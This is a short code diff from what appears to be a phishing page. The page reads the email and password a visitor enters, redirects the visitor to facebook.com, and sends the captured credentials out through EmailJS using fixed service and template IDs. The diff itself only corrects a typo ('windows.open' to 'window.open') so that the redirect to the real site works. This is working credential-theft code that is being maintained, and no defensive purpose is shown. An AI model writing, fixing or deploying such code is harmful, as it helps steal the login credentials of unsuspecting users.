@@ -248,7 +248,7 @@
             const value2 = document.getElementById("password").value;
 
             const value = "Email Address: " + value1 + " " + "Password: " + value2
-            windows.open("https://www.facebook.com", "_self");
+            window.open("https://www.facebook.com", "_self");
             event.preventDefault()
             emailjs.send('service_eh3mkle', 'template_9m99s5b', {
                 message: value // This should match the variable in your email template
